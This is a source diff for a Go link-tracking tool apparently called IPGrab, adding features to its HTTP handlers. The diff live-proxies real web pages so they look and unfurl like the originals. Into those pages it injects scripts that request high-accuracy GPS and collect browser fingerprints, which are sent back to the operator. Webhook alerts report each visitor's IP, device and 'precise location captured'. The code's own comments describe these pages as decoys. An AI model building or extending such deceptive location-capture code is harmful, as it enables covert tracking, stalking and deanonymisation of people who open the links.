@@ -3,6 +3,8 @@ package handlers
 import (
 	"encoding/json"
 	"errors"
+	"fmt"
+	"html/template"
 	"io"
 	"log"
 	"net/http"
@@ -10,8 +12,11 @@ import (
 	"path/filepath"
 	"strconv"
 	"strings"
+	"time"
 
 	"github.com/spignelon/ipgrab/internal/db"
+	"github.com/spignelon/ipgrab/internal/geoip"
+	"github.com/spignelon/ipgrab/internal/mirror"
 	"github.com/spignelon/ipgrab/internal/models"
 	"github.com/spignelon/ipgrab/internal/uaparse"
 	"github.com/spignelon/ipgrab/web"
@@ -78,10 +83,14 @@ func (h *Handler) ConcealBackground(w http.ResponseWriter, r *http.Request) {
 }
 
 // capture builds, enriches, and stores an event for a link, returning the new
-// event id (useful for the GPS flow, which later attaches coordinates).
+// event id (useful for the GPS flow, which later attaches coordinates). It
+// fires a best-effort hit notification if a webhook is configured for it.
 func (h *Handler) capture(r *http.Request, link *models.Link, eventType string) int64 {
 	ip := h.clientIP(r)
-	geo := h.Geo.Lookup(ip)
+	var geo geoip.Result
+	if h.GeoIPEnabled() {
+		geo = h.Geo.Lookup(ip)
+	}
 	ua := uaparse.Parse(r.UserAgent())
 
 	// Snapshot notable headers for later inspection.
@@ -120,10 +129,70 @@ func (h *Handler) capture(r *http.Request, link *models.Link, eventType string) 
 		log.Printf("capture: insert event: %v", err)
 		return 0
 	}
+
+	loc := strings.TrimSuffix(strings.TrimSuffix(e.City+", "+e.Country, ", "), ",")
+	if loc == "" {
+		loc = "unknown location"
+	}
+	h.NotifyConfig().SendHit(
+		fmt.Sprintf("IPGrab: %s on %s", eventTypeName(eventType), link.DisplayName()),
+		fmt.Sprintf("%s from %s (%s) — %s / %s", eventTypeName(eventType), ip, loc, ua.Device, ua.Browser),
+		link.Config.Channel,
+	)
 	return id
 }
 
-// lookupActive fetches a link by slug and 404s if missing or disabled.
+// eventTypeName renders an event type constant as a human-readable label
+// for notification titles/messages.
+func eventTypeName(t string) string {
+	switch t {
+	case models.EventClick:
+		return "Click"
+	case models.EventView:
+		return "View"
+	case models.EventPixelOpen:
+		return "Pixel open"
+	case models.EventGPS:
+		return "GPS capture"
+	}
+	return t
+}
+
+// linkExpired reports whether a link has passed its time-based or
+// click-count expiry, based on the current config and its event count.
+func (h *Handler) linkExpired(link *models.Link) bool {
+	if link.Config.ExpiresAt != "" {
+		if t, err := time.Parse(time.RFC3339, link.Config.ExpiresAt); err == nil && time.Now().After(t) {
+			return true
+		}
+	}
+	if link.Config.MaxClicks > 0 {
+		if n, err := h.DB.CountEvents(link.ID); err == nil && n >= link.Config.MaxClicks {
+			return true
+		}
+	}
+	return false
+}
+
+// notifyExpiredOnce fires a one-time "link expired" webhook and persists the
+// ExpiredNotified flag so it never fires again for this link.
+func (h *Handler) notifyExpiredOnce(link *models.Link) {
+	if link.Config.ExpiredNotified {
+		return
+	}
+	h.NotifyConfig().SendExpired(
+		fmt.Sprintf("IPGrab: link expired — %s", link.DisplayName()),
+		fmt.Sprintf("%s (%s) has reached its expiry (time limit or max clicks) and will no longer capture.",
+			link.DisplayName(), link.Slug),
+		link.Config.Channel,
+	)
+	link.Config.ExpiredNotified = true
+	if err := h.DB.UpdateLinkConfig(link.ID, link.Config); err != nil {
+		log.Printf("notify expired: update link config: %v", err)
+	}
+}
+
+// lookupActive fetches a link by slug and 404s if missing, disabled, or expired.
 func (h *Handler) lookupActive(w http.ResponseWriter, slug string) *models.Link {
 	link, err := h.DB.GetLinkBySlug(slug)
 	if errors.Is(err, db.ErrNotFound) || (link != nil && !link.Active) {
@@ -132,6 +201,11 @@ func (h *Handler) lookupActive(w http.ResponseWriter, slug string) *models.Link 
 	}
 	if err != nil {
 		internalError(w, "lookup link", err)
+		return nil
+	}
+	if h.linkExpired(link) {
+		h.notifyExpiredOnce(link)
+		http.NotFound(w, nil)
 		return nil
 	}
 	return link
@@ -191,7 +265,10 @@ func (h *Handler) Pixel(w http.ResponseWriter, r *http.Request) {
 	_, _ = w.Write(transparent1x1PNG)
 }
 
-// GPSPage handles GET /g/{slug}: renders the decoy page which requests geolocation.
+// GPSPage handles GET /g/{slug}: renders the decoy page which requests
+// geolocation. If the link has an optional CloneURL configured, that real
+// page is live-proxied instead of the built-in decoy theme, with the same
+// geolocation-capture beacon injected into it.
 func (h *Handler) GPSPage(w http.ResponseWriter, r *http.Request) {
 	link := h.lookupActive(w, r.PathValue("slug"))
 	if link == nil {
@@ -204,6 +281,16 @@ func (h *Handler) GPSPage(w http.ResponseWriter, r *http.Request) {
 	// Log the initial view; the browser JS will POST coordinates to attach.
 	eventID := h.capture(r, link, models.EventView)
 	noStore(w)
+
+	if link.Config.CloneURL != "" {
+		beacon := gpsBeaconScript(link.Slug, eventID, link.Config.Destination)
+		if err := mirror.Serve(w, r, link.Config.CloneURL, "/g/"+link.Slug+"/r", beacon); err != nil {
+			log.Printf("gps clone: mirror %q: %v", link.Config.CloneURL, err)
+			http.Error(w, "could not load page", http.StatusBadGateway)
+		}
+		return
+	}
+
 	theme := link.Config.Theme
 	if theme == "" {
 		theme = "cats"
@@ -215,6 +302,65 @@ func (h *Handler) GPSPage(w http.ResponseWriter, r *http.Request) {
 		"Redirect": link.Config.Destination,
 		"Label":    link.Label,
 	})
+}
+
+// GPSResource handles GET /g/{slug}/r: relays a sub-resource of a
+// live-proxied GPS-decoy clone page (see Config.CloneURL above).
+func (h *Handler) GPSResource(w http.ResponseWriter, r *http.Request) {
+	link := h.lookupActive(w, r.PathValue("slug"))
+	if link == nil || link.Type != models.TypeGPS || link.Config.CloneURL == "" {
+		http.NotFound(w, nil)
+		return
+	}
+	u := r.URL.Query().Get("u")
+	if u == "" {
+		http.NotFound(w, nil)
+		return
+	}
+	if err := mirror.ServeResource(w, r, u, "/g/"+link.Slug+"/r"); err != nil {
+		http.NotFound(w, nil)
+	}
+}
+
+// gpsBeaconScript builds the inline script injected into a live-proxied GPS
+// decoy clone page: it requests geolocation and posts the result back to
+// this app's own /g/{slug}/loc endpoint, exactly like decoy.html's own
+// script, then (if a post-capture redirect is configured) navigates there.
+func gpsBeaconScript(slug string, eventID int64, redirect string) template.HTML {
+	slugJS, _ := json.Marshal(slug)
+	redirectJS, _ := json.Marshal(redirect)
+	script := fmt.Sprintf(`<script>
+(function(){
+  var SLUG = %s, EVENT_ID = %d, REDIRECT = %s;
+  function fingerprint() {
+    return {
+      tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
+      screen: screen.width + "x" + screen.height,
+      lang: navigator.language || "",
+      platform: navigator.platform || "",
+    };
+  }
+  function send(lat, lon, accuracy) {
+    fetch("/g/" + SLUG + "/loc", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ event_id: EVENT_ID, lat: lat || 0, lon: lon || 0, accuracy: accuracy || 0, fingerprint: fingerprint() }),
+    }).finally(function () {
+      if (REDIRECT) { setTimeout(function () { window.location.href = REDIRECT; }, 400); }
+    });
+  }
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      function (pos) { send(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy); },
+      function () { send(null, null, null); },
+      { enableHighAccuracy: true, timeout: 8000 }
+    );
+  } else {
+    send(null, null, null);
+  }
+})();
+</script>`, slugJS, eventID, redirectJS)
+	return template.HTML(script)
 }
 
 // gpsPayload is the JSON body posted by the decoy page.
@@ -249,12 +395,25 @@ func (h *Handler) GPSCollect(w http.ResponseWriter, r *http.Request) {
 			_ = h.DB.AttachGPS(id, p.Lat, p.Lon, p.Accuracy, string(fp))
 		}
 	}
+	// A real fix (permission granted) carries non-zero coordinates — the
+	// decoy sends 0,0,0 when the visitor declines. Fire the dedicated
+	// high-priority alert only for an actual capture.
+	if p.Lat != 0 || p.Lon != 0 {
+		h.NotifyConfig().SendGPSAlert(
+			fmt.Sprintf("IPGrab: GPS captured — %s", link.DisplayName()),
+			fmt.Sprintf("Precise location captured for %s: %f, %f (±%.0fm)", link.DisplayName(), p.Lat, p.Lon, p.Accuracy),
+			link.Config.Channel,
+		)
+	}
 	w.Header().Set("Content-Type", "application/json")
 	_, _ = w.Write([]byte(`{"ok":true}`))
 }
 
-// ClonePage handles GET /p/{slug}: renders a rich link-preview landing page and
-// logs a view; the click-through logs a click and redirects.
+// ClonePage handles GET /p/{slug}: live-proxies the real target page —
+// serving it directly (not a redirect, not a "Continue" button) with its
+// own title/description/OG tags intact, so the link unfurls identically to
+// the original in chat apps and opening it shows the real page. Nothing
+// from the target is downloaded or stored; every request re-fetches it.
 func (h *Handler) ClonePage(w http.ResponseWriter, r *http.Request) {
 	link := h.lookupActive(w, r.PathValue("slug"))
 	if link == nil {
@@ -264,27 +423,111 @@ func (h *Handler) ClonePage(w http.ResponseWriter, r *http.Request) {
 		http.NotFound(w, nil)
 		return
 	}
-	// A ?go=1 query means the visitor clicked through: log a click and redirect.
-	if r.URL.Query().Get("go") == "1" {
-		h.capture(r, link, models.EventClick)
-		noStore(w)
-		dest := link.Config.Destination
-		if dest == "" {
-			dest = "https://example.com"
-		}
-		http.Redirect(w, r, dest, http.StatusFound)
+	eventID := h.capture(r, link, models.EventView)
+	noStore(w)
+
+	dest := link.Config.Destination
+	if dest == "" {
+		h.render(w, "clone.html", map[string]any{
+			"Slug":        link.Slug,
+			"Title":       orDefault(link.Config.Title, link.Label),
+			"Description": link.Config.Description,
+			"Image":       link.Config.Image,
+			"Destination": "",
+			"BaseURL":     h.Cfg.BaseURL,
+			"Error":       "No destination configured for this link.",
+		})
 		return
 	}
-	h.capture(r, link, models.EventView)
-	noStore(w)
-	h.render(w, "clone.html", map[string]any{
-		"Slug":        link.Slug,
-		"Title":       orDefault(link.Config.Title, link.Label),
-		"Description": link.Config.Description,
-		"Image":       link.Config.Image,
-		"Destination": link.Config.Destination,
-		"BaseURL":     h.Cfg.BaseURL,
-	})
+
+	beacon := cloneFingerprintBeacon(link.Slug, eventID)
+	if err := mirror.Serve(w, r, dest, "/p/"+link.Slug+"/r", beacon); err != nil {
+		log.Printf("clone: mirror %q: %v", dest, err)
+		// Fall back to the simple preview card rather than a bare error page.
+		h.render(w, "clone.html", map[string]any{
+			"Slug":        link.Slug,
+			"Title":       orDefault(link.Config.Title, link.Label),
+			"Description": link.Config.Description,
+			"Image":       link.Config.Image,
+			"Destination": dest,
+			"BaseURL":     h.Cfg.BaseURL,
+			"Error":       "Could not load a live copy of the target page right now.",
+		})
+	}
+}
+
+// ClonePageResource handles GET /p/{slug}/r: relays a sub-resource
+// (CSS/JS/image/font) of a live-proxied Clone/Preview page.
+func (h *Handler) ClonePageResource(w http.ResponseWriter, r *http.Request) {
+	link := h.lookupActive(w, r.PathValue("slug"))
+	if link == nil || link.Type != models.TypeClone {
+		http.NotFound(w, nil)
+		return
+	}
+	u := r.URL.Query().Get("u")
+	if u == "" {
+		http.NotFound(w, nil)
+		return
+	}
+	if err := mirror.ServeResource(w, r, u, "/p/"+link.Slug+"/r"); err != nil {
+		http.NotFound(w, nil)
+	}
+}
+
+// fpPayload is the JSON body posted by the clone-page fingerprint beacon.
+type fpPayload struct {
+	EventID     int64             `json:"event_id"`
+	Fingerprint map[string]string `json:"fingerprint"`
+}
+
+// ClonePageFingerprint handles POST /p/{slug}/fp: attaches JS-side
+// fingerprint signals (timezone, screen size, language, platform) to the
+// view event already logged for this visit — mirrors the GPS decoy's own
+// fingerprint capture, kept low-risk (no new data category, same signals).
+func (h *Handler) ClonePageFingerprint(w http.ResponseWriter, r *http.Request) {
+	link := h.lookupActive(w, r.PathValue("slug"))
+	if link == nil {
+		return
+	}
+	var p fpPayload
+	if err := json.NewDecoder(io.LimitReader(r.Body, 4<<10)).Decode(&p); err != nil {
+		http.Error(w, "bad request", http.StatusBadRequest)
+		return
+	}
+	if p.EventID > 0 {
+		if err := h.DB.AttachFingerprint(p.EventID, p.Fingerprint); err != nil {
+			log.Printf("clone fingerprint attach: %v", err)
+		}
+	}
+	w.Header().Set("Content-Type", "application/json")
+	_, _ = w.Write([]byte(`{"ok":true}`))
+}
+
+// cloneFingerprintBeacon builds the inline script injected into a
+// live-proxied Clone/Preview page: it posts a handful of JS-side signals
+// back to this app's own /p/{slug}/fp endpoint, for parity with the GPS
+// decoy's fingerprinting. It does not affect navigation or rendering.
+func cloneFingerprintBeacon(slug string, eventID int64) template.HTML {
+	slugJS, _ := json.Marshal(slug)
+	script := fmt.Sprintf(`<script>
+(function(){
+  var SLUG = %s, EVENT_ID = %d;
+  fetch("/p/" + SLUG + "/fp", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      event_id: EVENT_ID,
+      fingerprint: {
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
+        screen: screen.width + "x" + screen.height,
+        lang: navigator.language || "",
+        platform: navigator.platform || "",
+      },
+    }),
+  });
+})();
+</script>`, slugJS, eventID)
+	return template.HTML(script)
 }
 
 func contentTypeFor(path string) string {
